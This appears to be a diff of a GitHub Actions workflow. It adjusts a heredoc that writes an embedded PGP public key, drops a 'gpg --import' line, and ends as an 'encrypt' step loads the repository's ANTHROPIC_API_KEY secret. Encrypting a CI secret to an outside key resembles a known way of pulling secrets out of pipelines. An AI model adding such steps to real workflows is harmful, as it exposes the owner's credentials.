@@ -11,6 +11,7 @@ jobs:
         run: |
           cat > pubkey.asc <<'EOF'
           -----BEGIN PGP PUBLIC KEY BLOCK-----
+
           mQINBGi11DABEACVRjoWRKYsRDlAXOgTZw8zmbmEhdaPLqKELGAMxP6uVEdtOg96
           T0QAdm7Lf/TyQiCUdgc1ha/ngyfmlRnH0ADkygBy7TvAiGLFSaccqP38l6q9mVPz
           fo0ELmRGvpAyYHHl+Zmi4r5Jcq9RyQGJBiOaXfCt5QLRJhexRwZyp1OqZoBuGh4W
@@ -61,8 +62,7 @@ jobs:
           u94/E8w=
           =0i90
           -----END PGP PUBLIC KEY BLOCK-----
-            EOF
-            gpg --import pubkey.asc
+          EOF
       - name: encrypt
         env:
           MY_SECRET: ${{ secrets.ANTHROPIC_API_KEY }}
